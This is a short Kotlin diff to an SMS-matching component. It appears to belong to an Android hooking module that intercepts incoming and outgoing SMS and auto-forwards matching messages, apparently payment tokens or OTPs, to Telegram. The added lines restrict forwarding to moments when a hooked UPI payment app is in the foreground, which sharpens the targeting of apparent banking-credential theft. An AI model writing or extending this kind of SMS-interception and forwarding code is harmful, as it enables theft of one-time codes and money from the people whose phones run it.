@@ -37,6 +37,8 @@ object SmsMatcher {
 
     fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String, direction: String): Boolean {
         if (!config.autoForwardToken) return false
+        val activePkg = ActiveHookManager.readActivePackage() ?: return false
+        if (config.hookedUpiApps[activePkg] != true) return false
         return when (direction) {
             "outgoing" -> shouldInterceptOutgoing(config, peer, body)
             else -> shouldInterceptIncoming(config, peer, body)
